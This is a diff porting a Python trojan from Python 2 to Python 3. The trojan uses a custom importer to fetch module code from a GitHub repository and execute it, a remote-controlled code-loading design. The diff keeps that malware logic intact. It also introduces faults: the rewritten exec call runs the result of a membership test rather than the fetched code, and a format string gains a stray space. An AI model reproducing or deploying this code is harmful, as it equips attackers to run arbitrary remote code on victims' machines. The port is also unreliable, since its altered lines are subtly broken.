@@ -6,7 +6,7 @@ import time
 import imp
 import random
 import threading
-import Queue
+import queue
 import os
 
 from github3 import login
@@ -17,7 +17,7 @@ trojan_config = "%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
 
-task_queue = Queue.Queue()
+task_queue = queue.Queue()
 configured = False
 
 
@@ -30,7 +30,7 @@ class GitImporter(object):
     def find_module(self, fullname, path=None):
 
         if configured:
-            print "[*] Attempting to retrieve %s" % fullname
+            print("[*] Attempting to retrieve % s" % fullname)
             new_library = get_file_contents("modules/%s" % fullname)
 
             if new_library is not None:
@@ -43,7 +43,7 @@ class GitImporter(object):
 
         module = imp.new_module(name)
 
-        exec self.current_module_code in module.__dict__
+        exec(self.current_module_code in module.__dict__)
 
         sys.modules[name] = module
 
@@ -61,13 +61,13 @@ def connect_to_github():
 def get_file_contents(filepath):
 
     gh, repo, branch = connect_to_github()
-
+    print("branch link : ", branch.links)
     tree = branch.commit.commit.tree.recurse()
 
     for filename in tree.tree:
 
         if filepath in filename.path:
-            print "[*] Found file %s" % filepath
+            print("[*] Found file %s" % filepath)
 
             blob = repo.blob(filename._json_data['sha'])
 
